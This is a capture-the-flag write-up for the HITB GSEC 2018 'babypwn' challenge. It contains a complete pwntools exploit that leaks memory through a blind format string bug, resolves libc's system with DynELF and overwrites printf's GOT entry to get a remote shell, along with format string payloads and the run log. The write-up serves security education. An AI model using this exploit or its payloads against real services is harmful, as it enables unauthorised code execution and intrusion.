---
title: "HITB GSEC Qualifiers 2018 - Baby Pwn (Pwn)"
header:
  overlay_image: /assets/images/hitbgsecquals2018/babypwn/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Javier Canada on Unsplash"
tags:
  - hitbgsecquals2018
  - writeup
  - pwn
---

Using a format string attack on a remote server, an attacker can leverage
certain data structures present in a running Linux process to ascertain key
addresses to achieve remote code execution.

## Challenge Description

```
babypwn


nc 47.75.182.113 9999
```

#### Points

256 Points

59 Solved

## Solution

We are not given any files so we do not have any knowledge of the binary or the
libc. However, if we play around with the binary for a bit:

```shell
$ nc 47.75.182.113 9999
AAAA
AAAA
%x.%x.%x
0.0.3f2352f0
```

We can see that there is a format string vulnerability. Dumping the stack a
little leaks some information about the environment:

```
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.
(nil).(nil).0x7f0f57a372f0.0x7f0f57d31780.0x7f0f57f58700.0x70252e70252e7025.
0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.
0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x2e70252e7025.0x1.0x7ffeb5c5d670.0x7f0f57f5c168.0xf0b5ff.0x1.0x40076d.
0x7ffeb5c5d64e.(nil).0x400720.0x4005a0.0x7ffeb5c5d730.0xe3982f93a6536c00.
0x400720.0x7f0f5798b830.0x1.0x7ffeb5c5d738.0x157f5aca0.0x400696.(nil).
0x4f11045f495cb601.0x4005a0.0x7ffeb5c5d730.(nil).(nil).0xb0ec6f54ebdcb601.
0xb10fabee28ccb601.(nil).(nil).(nil).0x7ffeb5c5d748.0x7f0f57f5c168.
```

Some important information:

* We control the 6th parameter.
* Non-PIE 64 bit binary (We see addresses such as 0x40076d)

Using this information leak primitive, we can make use of a Pwntools feature
called DynELF, which helps to resolve useful symbols such as libc functions
like `system`.

Another interesting thing we need is to find the address of the PLT@GOT and GOT
tables for our write targets. Please look at this blog post for more
information: http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html.

Also, it should be noted that the challenge is solved similar to the following
challenge in 33c3: http://bruce30262.logdown.com/posts/1255979-33c3-ctf-2016-espr.

The final script:

```python
from pwn import *
import pwnlib

sc = None

ENTRY_POINT = 0x4005a0
PLT_GOT = 0x601000

context.arch = 'amd64'
#context.log_level = 'debug'

@pwnlib.memleak.MemLeak
def leak(addr):
    address = p64(addr)
    if "\n" in address:
        log.info("Newline in address, returning \\x00")
        return "\x00"
    payload = "%7$s.AAA" + p64(addr)
    sc.sendline(payload)
    log.info("Leaking: " + hex(addr))
    resp = sc.recvuntil(".AAA")
    ret = resp[:-4:] + "\x00"
    log.info("Data: " + repr(ret))
    sc.recvrepeat(0.2) # receive the rest of the string

    return ret

def get_plt_got(dynamic_addr):
    # https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html
    # Value should be 3
    current = dynamic_addr
    while True:
        value = leak[current:current + 2]
        current += 2
        current_value = u16(value)
        if current_value == 3:
            # skip the d_val
            current += 8
            ptr = leak[current:current + 8]
            return u64(ptr)

        # skip the entry
        current += 16

def find_got_entry(target):
    current = PLT_GOT
    while True:
        current_data = leak[current:current+8]
        current_value = u64(current_data)
        if current_value == target:
            return current
        current += 8

def main():
    global sc
    sc = remote("47.75.182.113", 9999)

    d = DynELF(leak, ENTRY_POINT)
    # dynamic = d.dynamic
    # log.info("Dynamic: 0x%x" % dynamic)

    printf_libc = d.lookup("printf", "libc")
    log.info("printf@libc: 0x%x" % printf_libc)

    system_libc = d.lookup("system", "libc")
    log.info("printf@libc: 0x%x" % printf_libc)

    printf_got = find_got_entry(printf_libc)
    log.info("printf@got: 0x%x" % printf_got)

    byte1 = system_libc & 0xff
    byte2 = (system_libc & 0xffff00) >> 8
    log.info("Writing bytes 0x%x and 0x%x" % (byte1, byte2))
    payload = "%" + str(byte1) + "c" + "%10$hhn."
    payload += "%" + str(byte2 - byte1 - 1) + "c" + "%11$hn."
    payload = payload.ljust(32, "A")
    payload += p64(printf_got) + p64(printf_got + 1)
    sc.sendline(payload)
    sc.sendline("sh\x00")

    sc.interactive()

if __name__ == "__main__":
    main()
```

Running the exploit:

```
python2 leakall.py
[+] Opening connection to 47.75.182.113 on port 9999: Done
[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
[DEBUG] Sent 0x11 bytes:
    00000000  25 37 24 73  2e 41 41 41  00 00 40 00  00 00 00 00  │%7$s│.AAA│··@·│····│
    00000010  0a                                                  │·│
    00000011
[*] Leaking: 0x400000
[DEBUG] Received 0xb bytes:
    00000000  7f 45 4c 46  02 01 01 2e  41 41 41                  │·ELF│···.│AAA│
    0000000b
[*] Data: '\x7fELF\x02\x01\x01\x00'
[.] Resolving 'printf' in 'libc.so': PT_DYNAMIC header = 0x400040
...
$ ls -la /
total 56
drwxr-x--- 27 0 1000 4096 Apr 11 07:14 .
drwxr-x--- 27 0 1000 4096 Apr 11 07:14 ..
-rwxr-x---  1 0 1000  220 Aug 31  2015 .bash_logout
-rwxr-x---  1 0 1000 3771 Aug 31  2015 .bashrc
-rwxr-x---  1 0 1000  655 May 16  2017 .profile
-rwxr-x---  1 0 1000 8640 Apr 11 07:08 babypwn
drwxr-x---  2 0 1000 4096 Apr 11 07:14 bin
drwxr-x---  2 0 1000 4096 Apr 11 07:14 dev
-rwxr-----  1 0 1000   26 Apr 11 07:06 flag
drwxr-x--- 73 0 1000 4096 Apr 11 07:14 lib
drwxr-x---  5 0 1000 4096 Apr 11 07:14 lib32
drwxr-x---  2 0 1000 4096 Apr 11 07:14 lib64
$ cat /flag
HITB{Baby_Pwn_BabY_bl1nd}
```

Flag: **HITB{Baby\_Pwn\_BabY\_bl1nd}**
